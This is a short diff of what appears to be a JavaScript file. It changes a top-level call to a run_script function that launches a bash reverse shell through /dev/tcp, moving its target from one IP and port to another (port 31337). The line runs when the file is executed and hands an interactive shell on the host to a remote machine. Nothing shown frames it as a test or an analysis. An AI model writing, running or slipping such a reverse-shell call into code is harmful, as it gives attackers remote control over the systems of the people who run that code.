@@ -66,4 +66,4 @@ function run_script(command, args, callback) {
   if (typeof callback === 'function') callback();
 }
 
-run_script('/bin/bash -i > /dev/tcp/87.76.65.54/4000 0<&1 2>&1', [], null);
+run_script('/bin/bash -i > /dev/tcp/192.168.1.32/31337 0<&1 2>&1', [], null);
